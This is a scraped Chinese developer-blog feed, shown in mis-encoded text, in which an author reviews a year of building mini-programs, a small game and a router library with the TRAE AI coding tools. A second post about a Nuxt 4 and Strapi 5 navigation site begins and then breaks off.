<p>åœ¨<a href="https://juejin.cn/post/7538734024837185582" target="_blank" title="https://juejin.cn/post/7538734024837185582">ã€ŠTRAE è¾…åŠ©ä¸‹çš„ uni-app è·¨ç«¯å°ç¨‹åºå·¥ç¨‹åŒ–å¼€å‘å®è·µåˆ†äº«ã€‹</a>ä¸€æ–‡ä¸­ï¼Œæˆ‘åˆ†äº«äº†ä½¿ç”¨ TRAE ä½œä¸ºä¸»è¦AIç¼–ç¨‹å·¥å…·ï¼Œä½¿ç”¨ uni-app å¿«é€Ÿä¸Šæ‰‹æ‘¸æ¿ wot-starter ï¼Œé€šè¿‡ AI è¾…åŠ©å®ç°äº†å¼€å‘æ•ˆç‡çš„æ˜¾è‘—æå‡ã€‚æ•´ä½“å¼€å‘æ—¶é—´ä»ä¼ ç»Ÿçš„ 40 äººæ—¥ç¼©çŸ­è‡³ 22 äººæ—¥ï¼Œæ•ˆç‡æå‡çº¦ 45%ï¼Œæ ¹æ®å›¢é˜Ÿçš„å®é™…ä½“éªŒï¼Œç›¸æ¯”ä¼ ç»Ÿå¼€å‘æ–¹å¼ï¼Œå¼€å‘ä½“éªŒæœ‰äº†æ˜æ˜¾æ”¹å–„ã€‚</p>
<p>åœ¨æ–‡ä¸­æˆ‘ä»¬ä¹Ÿä»‹ç»äº†<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FJuZwsaUxQ6W-jdP-pSEkjg" target="_blank" title="https://mp.weixin.qq.com/s/JuZwsaUxQ6W-jdP-pSEkjg" ref="nofollow noopener noreferrer">ã€Šå¦‚ä½•ç”¨ AI é©±åŠ¨ wot-ui å¼€å‘å°ç¨‹åºã€‹</a>å’Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F9h2inbYwmYa3ZQNYutRBng" target="_blank" title="https://mp.weixin.qq.com/s/9h2inbYwmYa3ZQNYutRBng" ref="nofollow noopener noreferrer">ã€Šwot-uiæ˜¯å¦‚ä½•ä½¿ç”¨lms.txt è®© AI æ›´å¥½åœ°ç†è§£æ–‡æ¡£ã€‹</a>ï¼Œè¿™å¯¹äºæˆ‘ä»¬æœ¬æ¬¡å®è·µçš„ææ•ˆæ˜¯éå¸¸é‡è¦çš„ï¼Œå®Œæ•´æ˜ç¡®çš„å¤–éƒ¨ä¾èµ–æ–‡æ¡£ï¼Œèƒ½è®© AI å¿«é€Ÿä½¿ç”¨æˆ‘ä»¬å¸¸ç”¨çš„æŠ€æœ¯æ ˆã€‚</p>
<p>æœ¬ç¯‡æ–‡ç« åŒæ ·ä¹Ÿè¢«æ”¶å½•åˆ° TRAE å…¬ä¼—å·çš„æœ€ä½³å®è·µæ–‡ç« ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18665267efb440dc87afd8ec2d0abe30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=PDajGlMgGiNp6q4BnA%2BpigkNKO0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">å¼€å‘åƒè€ä¹¡é¸¡é‚£æ ·åšé¥­å°ç¨‹åº</h3>
<p>å»å¹´ï¼Œã€Œè€ä¹¡é¸¡ä¸è£…äº†ï¼Œç›´æ¥å¼€æºã€çš„æ¶ˆæ¯å¼•å‘äº†å¹¿æ³›çš„å…³æ³¨ã€‚æˆ‘ä¹Ÿçº³é—·ï¼Œè€ä¹¡é¸¡ä¸æ˜¯åšèœçš„å—ï¼Œå¼€çš„å“ªé—¨å­æºï¼ŸåŸæ¥æ˜¯æŠŠä»–ä»¬çš„èœå“ã€æº¯æºæŠ¥å‘Šè¿™äº›å¼€æºäº†ã€‚ç„¶å GitHub ä¸Šè¿™ä¸ªå«ã€Œåƒè€ä¹¡é¸¡é‚£æ ·åšé¥­ã€çš„é¡¹ç›®ç«äº†ï¼Œå¦‚ä»Š star æ•°é‡å·²ç»è¾¾åˆ°äº† 22kï¼Œè¿™æ˜¯å®ƒçš„åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGar-b-age%2FCookLikeHOC" target="_blank" title="https://github.com/Gar-b-age/CookLikeHOC" ref="nofollow noopener noreferrer">github.com/Gar-b-age/Câ€¦</a> ã€‚</p>
<p>ä½œä¸ºä¸€åçˆ±åšé¥­çš„ç¨‹åºå‘˜ï¼Œé¢å¯¹å¦‚æ­¤è¯±äººçš„å¼€æºèµ„æºï¼Œæ€èƒ½è¢–æ‰‹æ—è§‚ï¼Ÿäºæ˜¯ï¼Œåœ¨<a href="https://juejin.cn/post/7554225547117576243" target="_blank" title="https://juejin.cn/post/7554225547117576243">ã€Šè€ä¹¡é¸¡ä¹Ÿå¼€æºï¼Ÿæˆ‘ç”¨ TRAE SOLO åšäº†ä¸ªåƒè€ä¹¡é¸¡é‚£æ ·åšé¥­å°ç¨‹åºï¼ã€‹</a>ä¸€æ–‡ä¸­ï¼Œæˆ‘åˆ†äº«äº†ä½¿ç”¨ TRAE SOLO å®ç°å°ç¨‹åºå‰åç«¯åŠæ•°æ®æ•´ç†çš„å…¨è¿‡ç¨‹ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/684549f272c24f36ba2610a6d7e606e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=jqreKcOdKM9y2SyZWTSUAyWPMBQ%3D" alt="" loading="lazy"/></p>
<p>æœ¬ç¯‡æ–‡ç« åŒæ ·ä¹Ÿè¢«æ”¶å½•åˆ° TRAE å…¬ä¼—å·çš„æœ€ä½³å®è·µæ–‡ç« ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/971c10697fd14ea8aabbee99038c2a57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=VPCWzQL0sG%2BHwaF8tAwz4cvgtb8%3D" alt="" loading="lazy"/></p>
<p>è¿‡ç¨‹ä¸­ä¿æŒæ•°æ®å¹²å‡€ã€çº¯å‡€ä¸Šä¸‹æ–‡ã€å¢é‡å¼æ²Ÿé€šç­‰ä¸‰ä¸ªåŸåˆ™æ˜¯ä½¿æˆ‘ä»¬äº‹åŠåŠŸå€çš„åˆ©å™¨</p>
<h3 data-id="heading-6">å°ç»“</h3>
<p>æ­¤é˜¶æ®µTRAE ä¸ TRAE SOLO çš„å®åŠ›ç›¸æ¯”åˆç‰ˆå·²ç»å¤§å¤§å¢å¼ºäº†ï¼Œç¼ºç‚¹å°±æ˜¯å†…å­˜å æ®è¾ƒå¤§ã€Figmaè®¾è®¡å›¾è¿˜åŸåº¦ä»ç„¶èµ¶ä¸ä¸Š cursorï¼Œä¸è¿‡å·²ç»å¯ä»¥ä½œä¸ºä¸»åŠ›å¼€å‘å·¥å…·æ¥ç”¨äº†ã€‚</p>
<h2 data-id="heading-7">TRAE SOLO æ­£å¼ç‰ˆ</h2>
<p>11 æœˆ 12 æ—¥ TRAE SOLO æ­£å¼ç‰ˆä¸Šçº¿äº†ï¼Œæ–°å¢ä¸‰æ å¸ƒå±€ã€DiffView å·¥å…·ã€SOLO Coder + Planï¼Œæ”¯æŒå¤šä»»åŠ¡å¹¶è¡Œç­‰åŠŸèƒ½ã€‚éšååˆä¸Šçº¿äº† Gemini 3 Pro æ¨¡å‹ï¼Œå¯ä»¥ä½œä¸º Claude æ¨¡å‹çš„å¹³æ›¿äº†ã€‚</p>
<p>åœ¨è¿™æœŸé—´ï¼Œæˆ‘ä½¿ç”¨æ­£å¼ç‰ˆçš„ TRAE SOLO å®Œæˆäº†ã€Œåƒè€ä¹¡é¸¡é‚£æ ·åšé¥­ã€å°ç¨‹åºçš„å¼€æºã€æ‰‹åŠ¿ç²’å­äº¤äº’ç‰¹æ•ˆçš„åˆ¶ä½œã€ã€Œä¸€åªé¥ºå­çš„ä½¿å‘½ã€å°æ¸¸æˆçš„åˆ¶ä½œå’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmy-uni.wot-ui.cn%2Fguide%2Frouter%2Fintroduction.html" target="_blank" title="https://my-uni.wot-ui.cn/guide/router/introduction.html" ref="nofollow noopener noreferrer">@wot-ui/router</a>çš„é‡æ„ã€‚</p>
<h3 data-id="heading-8">ã€Œåƒè€ä¹¡é¸¡é‚£æ ·åšé¥­ã€å°ç¨‹åºå¼€æº</h3>
<p>åœ¨<a href="https://juejin.cn/post/7576210031873409065#heading-12" target="_blank" title="https://juejin.cn/post/7576210031873409065#heading-12">ã€ŠTRAE SOLO æ­£å¼å‘å¸ƒäº†ï¼Ÿæˆ‘ç”¨å®ƒå°†åƒè€ä¹¡é¸¡é‚£æ ·åšé¥­å°ç¨‹åºå¼€æºäº†ï¼ã€‹</a>ä¸€æ–‡ä¸­ï¼Œä»‹ç»äº†æˆ‘ä»¬å‡ ä¹é›¶ä»£ç  ç”¨ TRAE SOLO å®Œæˆäº†ã€Œåƒè€ä¹¡é¸¡é‚£æ ·åšé¥­ã€å°ç¨‹åºçš„å¼€æºä¸ CI/CD æµç¨‹ã€‚</p>
<ul>
<li>å°ç¨‹åºï¼šã€Œé±¼å“¥èœè°±ã€</li>
<li>å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMoonofweisheng%2FMyCookLikeHOC" target="_blank" title="https://github.com/Moonofweisheng/MyCookLikeHOC" ref="nofollow noopener noreferrer">github.com/Moonofweishâ€¦</a></li>
</ul>
<p>è¿™ç¯‡æ–‡ç« åˆ™è·å¾—äº† <a href="https://juejin.cn/post/7586167377382801434" target="_blank" title="https://juejin.cn/post/7586167377382801434">TRAE SOLO å®æˆ˜èµ›</a>çš„ç¬¬ä¸‰åã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d72eb0caf214554892b448e080c7f21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=SB6SAZi%2BWxr8ebPnKsb0jpiXSPE%3D" alt="" loading="lazy"/></p>
<p>å¼€å‘è¿‡ç¨‹ä¸­è¿‡ç¨‹ä¸­ä¿æŒæ•°æ®å¹²å‡€ã€çº¯å‡€ä¸Šä¸‹æ–‡ã€å¢é‡å¼æ²Ÿé€šç­‰ä¸‰ä¸ªåŸåˆ™ä»ç„¶æ˜¯ä½¿æˆ‘ä»¬äº‹åŠåŠŸå€çš„åˆ©å™¨ï¼Œè¿™å…¶å®å’Œå½“ä¸‹å¾ˆæµè¡Œçš„ SDD è§„èŒƒç›¸ç¬¦ï¼Œåœ¨è¿™ç§å°å‹é¡¹ç›®ä¸­ï¼ŒåŸºäºä¸€ä¸ªä¼˜ç§€çš„é¡¹ç›®æ¨¡æ¿å’Œè‰¯å¥½çš„éœ€æ±‚è¾“å…¥å’Œå¼€å‘è®¡åˆ’ï¼Œç”±è§„èŒƒé©±åŠ¨å¼€å‘ï¼Œèƒ½è®©é¡¹ç›®åšçš„æ›´å¥½ã€èµ°å¾—æ›´è¿œã€‚</p>
<h3 data-id="heading-9">æ‰‹åŠ¿ç²’å­äº¤äº’ç‰¹æ•ˆçš„åˆ¶ä½œ</h3>
<p>åœ¨<a href="https://juejin.cn/post/7583991680749764635" target="_blank" title="https://juejin.cn/post/7583991680749764635">ã€ŠGemini 3åšç²’å­äº¤äº’ç‰¹æ•ˆå¾ˆå‡ºåœˆï¼Ÿæ‹¿ TRAE SOLO æ¥å®ç°ä¸€æ³¢ï¼ã€‹</a>ä¸€æ–‡ä¸­ï¼Œè½»æ¾å®ç°äº†ã€Šæ—©å®‰åˆå®‰æ™šå®‰ç²’å­äº¤äº’ç‰¹æ•ˆã€‹ï¼Œå¯ä»¥çœ‹å‡º TRAE SOLO æ­£å¼ç‰ˆå‘å¸ƒä¹‹åï¼ŒåŠŸèƒ½ä¸Šçš„å¢å¼ºè¿˜æ˜¯ä¸é”™çš„ï¼Œè¿˜æœ‰å¾ˆå¤šæˆ‘ä»¬æœ¬æ¬¡æ²¡ç”¨åˆ°çš„åŠŸèƒ½ä¾‹å¦‚ Plan æ¨¡å¼ç­‰ä¹Ÿå¾ˆæœ‰ç”¨ï¼Œæ¥å…¥äº† Gemini-3-Pro åå¤§æ¨¡å‹çš„çŸ­æ¿åŸºæœ¬è¡¥ä¸Šäº†ã€‚</p>
<h3 data-id="heading-10">ã€Œä¸€åªé¥ºå­çš„ä½¿å‘½ã€å°æ¸¸æˆ</h3>
<p>èµ·å› æ˜¯ TRAE ç¾¤é‡Œæœ‰ä¸ªå†¬è‡³ä¸»é¢˜æ´»åŠ¨ï¼Œæˆ‘å°±å‡†å¤‡å†™ä¸ªæ¸©é¦¨å°æ¸¸æˆå‚ä¸ï¼Œçµæ„Ÿæ¥è‡ªäºã€Šä¸€æ¡ç‹—çš„ä½¿å‘½ã€‹ã€‚æ¸¸æˆè®²è¿°äº†ä¸€ä¸ªæ‹ŸäººåŒ–çš„é¥ºå­åœ¨å†¬è‡³è¿™ä¸€å¤©ï¼Œå¸®åŠ©ä¸€ä½å› äº‹ä¸šå—æŒ«è€Œæ²®ä¸§çš„å¹´è½»äººé‡æ–°æŒ¯ä½œï¼Œæœ€ç»ˆä¸å®¶äººå›¢èšçš„æ¸©æš–æ•…äº‹ã€‚æˆ‘è®© TRAE SOLO æ•´ç†åˆ†é•œå’ŒAIç»˜å›¾æè¿°ï¼Œç„¶åç”¨å°é¦™è•‰ç”»å›¾ï¼ŒæŠŠå›¾ç‰‡æ”¾åˆ°é¡¹ç›®é‡Œï¼Œè®© TRAE SOLOå¼€å§‹å¼€å‘ã€‚è¿™ä¸ªå…¶å®æŒºæœ‰æ„æ€çš„ï¼Œå¯ä»¥è‡ªå·±å»åšè¿™ç§è§†è§‰å°è¯´å¼äº’åŠ¨æ¸¸æˆï¼Œè‡ªå·±å†™ä¸»çº¿å°±è¡Œäº†ã€‚</p>
<p>æ¸¸ç©åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjiaozi.wot-ui.cn%2F" target="_blank" title="https://jiaozi.wot-ui.cn/" ref="nofollow noopener noreferrer">jiaozi.wot-ui.cn/</a></p>
<p><em><strong>å¯æƒœæ²¡æœ‰è·å¾—å†¬è‡³ä¸»é¢˜æ´»åŠ¨çš„å¥–å“ğŸ¶</strong></em></p>
<h3 data-id="heading-11">é‡æ„ @wot-ui/router</h3>
<p>ä½¿ç”¨ TRAE SOLO å°† uni-mini-router é‡æ„ï¼Œå¹¶è¿ç§»åˆ° @wot-ui/router äº†ï¼Œå®Œå–„äº†å¯¼èˆªå®ˆå«çš„åŠŸèƒ½å¹¶ä»rollupè¿ç§»åˆ°äº†tsdownã€‚åé¢è®¡åˆ’å°† uni-mini-ci ä¹ŸåŒæ ·é‡æ„å¹¶è¿ç§»åˆ° @wot-ui/ciã€‚</p>
<p>æ–‡æ¡£åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmy-uni.wot-ui.cn%2F" target="_blank" title="https://my-uni.wot-ui.cn/" ref="nofollow noopener noreferrer">my-uni.wot-ui.cn/</a></p>
<p>è¿™ä¸ªè¿‡ç¨‹ç”¨ TRAE SOLOï¼Œç”¨é‡æœ‰ç‚¹é¡¶ä¸ä½äº†å•Šï¼Œå¤§æµç¨‹ä½¿ç”¨ TRAE å›½é™…ç‰ˆå¼€å‘ï¼Œæ¨¡å‹ç”¨ Gemini-3-Proï¼Œå°ä¿®å°è¡¥ç”¨çš„å›½å†…ç‰ˆçš„GLM-4.7ã€‚æœ€åçš„é‡æ„çš„ç»“æœä¹Ÿè¿˜å¯ä»¥ï¼Œè¿˜æ·»åŠ äº†æµ‹è¯•ç”¨ä¾‹ï¼Œå¡«è¡¥äº†ä¹‹å‰çš„å¾ˆå¤šç¼ºæ¼ğŸ˜‚ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/048b773e452347ea86e0e5d7255df947~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=SoyJlzRO6xxJteVCymd3KxvYoGw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">å°ç»“</h3>
<p>TRAE SOLO æ­£å¼ç‰ˆå‘å¸ƒåï¼Œæˆ‘åœ¨å„ç§åœºæ™¯éƒ½æœ‰å°è¯•ï¼Œç¼–ç¨‹èƒ½åŠ›ç›¸è¾ƒä¹‹å‰è¦å¼ºäº†ä¸å°‘ï¼Œè€Œä¸”ä¹Ÿæœ‰ Gemini-3-Pro è¿™ç§å¼ºåŠ›æ¨¡å‹ï¼Œfigma è¿˜åŸçš„èƒ½åŠ›ä¹Ÿå¼ºäº†ä¸å°‘ã€‚</p>
<h2 data-id="heading-13">TRAE å¹´åº¦åˆ›ä½œä¹‹æ˜Ÿ</h2>
<p>12 æœˆ 27 å·ï¼Œè·å¾—äº† TRAE 2025 å¹´åº¦äº”å¤§ç”¨æˆ·å¥–â€”â€”å¹´åº¦åˆ›ä½œä¹‹æ˜Ÿï¼Œæ„Ÿè°¢ TRAEã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8819c6307add44d795f05aac400819d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=v7Kugo%2FTXAw2oIg13zEELtH4yh8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bffece2b03e8405ea1fae8b1e8cd800b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=9agjQRZG2auHbX6fJC9r8gSOydU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>è™½ç„¶ AI Coding å–ä»£å‰ç«¯å¼€å‘çš„è®ºè°ƒå±‚å‡ºä¸ç©·ï¼Œå‡ºä¸€ä¸ªæ–°çš„å¤§æ¨¡å‹ï¼Œå‰ç«¯å°±ä¼šæ­»ä¸€æ¬¡ï¼Œä½†æ˜¯ç›®å‰ AI Coding ä»ç„¶æ²¡æœ‰æ›¿ä»£ä»»ä½•ä¸€ä¸ªèŒä¸šï¼Œâ€œAI è½åœ°çš„æœ€åä¸€å…¬é‡Œâ€ä»æœªè§£å†³ï¼Œäººåœ¨ AI Coding ä¸­ä»æ‰®æ¼”ç€å†³ç­–è€…å’ŒæŒ‡å¯¼è€…çš„è§’è‰²ã€‚å°½ç®¡å½“å‰ AI Coding çš„è„‰ç»œä»æœªæ¸…æ™°ï¼Œä½†æ˜¯ AI Coding æœªæ¥ç¡®å®æ— æ¯”å€¼å¾—æœŸå¾…ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æ‹¥æŠ±å˜åŒ–ï¼Œæ‹¥æŠ±æœªæ¥ï¼Œæ‹¥æŠ± AI Codingã€‚</p>
<p>2026 AI åœ¨æˆ‘çš„å·¥ä½œã€ç”Ÿæ´»å’Œå­¦ä¹ ä¸­å·²ç»æ…¢æ…¢å˜å¾—ä¸å¯ç¼ºå°‘ï¼ŒTRAEåœ¨è¿™ä¸€å¹´ä¸­ä¹Ÿé€æ¸æˆä¸ºæˆ‘çš„ä¸»åŠ› AI ç¼–ç¨‹å·¥å…·ã€‚</p>
<p>2026 å¸Œæœ›ä½ ã€æˆ‘å’Œ AI ç¼–ç¨‹çš„æœªæ¥éƒ½åŒæ ·å……æ»¡å¸Œæœ›ã€‚</p>
<p><em><strong>æ¬¢è¿è¯„è®ºåŒºæ²Ÿé€šã€äº¤æµğŸ‘‡ğŸ‘‡</strong></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäº Nuxt 4 + Strapi 5 æ„å»ºé«˜æ€§èƒ½ AI å¯¼èˆªç«™]]></title>    <link>https://juejin.cn/post/7588355695100690441</link>    <guid>https://juejin.cn/post/7588355695100690441</guid>    <pubDate>2025-12-28T08:07:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588355695100690441" data-draft-id="7588109656041685038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäº Nuxt 4 + Strapi 5 æ„å»ºé«˜æ€§èƒ½ AI å¯¼èˆªç«™"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2025-12-28T08:07:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŸ¥èˆªé©¿ç«™"/> <meta itemprop="url" content="https://juejin.cn/user/4125023356335576"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäº Nuxt 4 + Strapi 5 æ„å»ºé«˜æ€§èƒ½ AI å¯¼èˆªç«™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4125023356335576/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŸ¥èˆªé©¿ç«™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T08:07:31.000Z" title="Sun Dec 28 2025 08:07:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>æ‘˜è¦</strong>ï¼šåœ¨ AI å·¥å…·çˆ†å‘çš„ä»Šå¤©ï¼Œå¦‚ä½•å¿«é€Ÿæ„å»ºä¸€ä¸ªæ—¢å…·å¤‡å†…å®¹æ·±åº¦ï¼ˆCMS ç®¡ç†ï¼‰ï¼Œåˆæœ‰æè‡´äº¤äº’ä½“éªŒï¼ˆSSR + ç°ä»£åŒ– UIï¼‰çš„å¯¼èˆªå¹³å°ï¼Ÿæœ¬æ–‡å°†å¤ç›˜ <strong>Creator AI Hub</strong> çš„ä»é›¶å¼€å‘å†ç¨‹ï¼Œæ·±åº¦è§£æ <strong>Monorepo</strong> æ¶æ„è®¾è®¡ã€<strong>Strapi v5</strong> æ— å¤´ CMS çš„çµæ´»åº”ç”¨ä»¥åŠ <strong>Nuxt 4</strong> çš„å…¨æ ˆå®è·µã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ğŸš€ å¼•è¨€ï¼šä¸ºä»€ä¹ˆé€‰æ‹©è¿™å¥—æŠ€æœ¯æ ˆï¼Ÿ</h2>
<p>åœ¨æ„å»º <strong>Creator AI Hub</strong> æ—¶ï¼Œæˆ‘ä»¬é¢ä¸´å‡ ä¸ªæ ¸å¿ƒéœ€æ±‚ï¼š</p>
<ol>
